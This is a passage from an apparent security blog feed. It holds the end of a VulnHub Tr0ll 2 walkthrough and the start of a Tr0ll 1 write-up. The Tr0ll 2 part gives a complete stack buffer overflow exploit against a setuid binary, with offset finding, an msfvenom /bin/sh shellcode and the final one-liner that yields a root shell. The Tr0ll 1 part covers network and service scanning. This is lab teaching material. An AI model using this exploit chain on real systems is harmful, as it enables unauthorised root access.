int main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;int, char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

Non-debugging symbols:
0x080482f4  _init
0x08048340  &lt;span class=&quot;nb&quot;&gt;printf
&lt;/span&gt;0x08048340  &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt
0x08048350  strcpy
0x08048350  strcpy@plt
0x08048360  __gmon_start__
0x08048360  __gmon_start__@plt
0x08048370  &lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;0x08048370  &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On the attacking machine we generate a string of 300 characters with &lt;strong&gt;pattern_create&lt;/strong&gt; utility.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msf-pattern_create &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We run the binary with the generated string, and we see that it caused a crash.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /home/noob/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We identify the offset with the &lt;strong&gt;pattern_offset&lt;/strong&gt; utility at 268 characters, as shown below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msf-pattern_offset &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; 300 &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; 0x6a413969
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Exact match at offset 268
root@kali:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We check if we control the &lt;strong&gt;eip&lt;/strong&gt; register as follows.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A'*268 + 'B'*4 + 'C'*100)&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
Starting program: /home/noob/r00t &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A'*268 + 'B'*4 + 'C'*100)&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;

Program received signal SIGSEGV, Segmentation fault.
0x42424242 &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; ?? &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see above the return address was controlled.&lt;/p&gt;

&lt;p&gt;We verify the address to the &lt;strong&gt;esp&lt;/strong&gt; register to locate our shellcode there, &lt;strong&gt;0xbffffb80&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/40wx &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
0xbffffb80:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffb90:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffba0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffbb0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffbc0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffbd0:     0x43434343      0x43434343      0x43434343      0x43434343
0xbffffbe0:     0x43434343      0x08048300      0x00000000      0x080483b1
0xbffffbf0:     0x08048444      0x00000002      0xbffffc14      0x080484b0
0xbffffc00:     0x08048520      0xb7fed280      0xbffffc0c      0xb7fff918
0xbffffc10:     0x00000002      0xbffffd2c      0xbffffd3c      0x00000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We generate our shellcode in this case msfvenom generates one of 70 bytes.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x86 &lt;span class=&quot;nt&quot;&gt;--platform&lt;/span&gt; linux &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/exec &lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; python &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shellcode.txt 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We copy the shellcode.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;.*&quot;'&lt;/span&gt; shellcode.txt | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/&quot;//g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt; | xclip &lt;span class=&quot;nt&quot;&gt;-sel&lt;/span&gt; c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We build our malicious instruction as follows, first with 268 A’s, then with the return address &lt;strong&gt;0xbffffb80&lt;/strong&gt;, then with 10 NOPs (\x90) and finally with the shellcode.&lt;/p&gt;

&lt;p&gt;To run our malicious instruction we need to find the vulnerable binary, in this case the one with size 8401, and run it, giving us a root shell, if you notice we change the hex value from 80 to 60, since the address is different outside of gdb.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;noob@Tr0ll2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find /nothing_to_see_here/ &lt;span class=&quot;nt&quot;&gt;-size&lt;/span&gt; 8401c &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; r00t
/nothing_to_see_here/choose_wisely/door2/r00t

noob@Tr0ll2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A'*268 + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ff&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bf' + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;90'*10 + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;3d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;96&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;03&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;02&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;75&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;da&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;71&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;8d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;d5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;4c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ef&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;da&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;9c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;bb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;5a&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b6&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;36')&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;noob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;noob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;noob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
root@Tr0ll2:/home/noob#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We read the flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@Tr0ll2:/root# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Proof.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Proof.txt
You win this &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present.</summary></entry><entry><title type="html">VulnHub - Tr0ll 1</title><link href="http://localhost:4000/tr0ll1.html" rel="alternate" type="text/html" title="VulnHub - Tr0ll 1" /><published>2021-12-29T00:00:00-05:00</published><updated>2021-12-29T00:00:00-05:00</updated><id>http://localhost:4000/tr0ll1</id><content type="html" xml:base="http://localhost:4000/tr0ll1.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; Maleus&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; To gain root and get Proof.txt from the /root directory.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/tr0ll-1,100/&quot;&gt;https://www.vulnhub.com/entry/tr0ll-1,100/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;To discover the target machine on the local network an ARP scan was performed.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arp-scan &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; vmnet1  192.168.179.0/24 
Interface: vmnet1, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
Starting arp-scan 1.9.7 with 256 hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://github.com/royhills/arp-scan&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
192.168.179.182 00:0c:29:39:e9:62       VMware, Inc.
192.168.179.254 00:50:56:ec:aa:69       VMware, Inc.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;With the aim of discover open ports a full UDP/TCP scan was did with unicornscan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;us &lt;span class=&quot;nt&quot;&gt;-msf&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt; 192.168.179.182 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 3000 &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 3 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; us &lt;span class=&quot;nt&quot;&gt;-mU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt; 192.168.179.182 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 3000 &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 3 
TCP open                     ftp[   21]         from 192.168.179.182  ttl 64 
TCP open                     ssh[   22]         from 192.168.179.182  ttl 64 
TCP open                    http[   80]         from 192.168.179.182  ttl 64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;An aggressive scan was performed to detect the services and versions of the open ports.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,80 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 192.168.179.182 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION                                                                                                                                        
21/tcp open  ftp     vsftpd 3.0.2                                                                                                                                   
| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                              
|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;NSE: writeable]                                                                                 
| ftp-syst:                                                                                                                                                         
|   STAT:                                                                                                                                                           
| FTP server status:                                                                                                                                                
|      Connected to 192.168.179.1                                                                                                                                   
|      Logged &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as ftp                                                                                                                                             
|      TYPE: ASCII                                                                                                                                                  
|      No session bandwidth limit                                                                                                                                   
|      Session &lt;span class=&quot;nb&quot;&gt;timeout &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;seconds is 600                                                                                                                            
|      Control connection is plain text                                                                                                                             
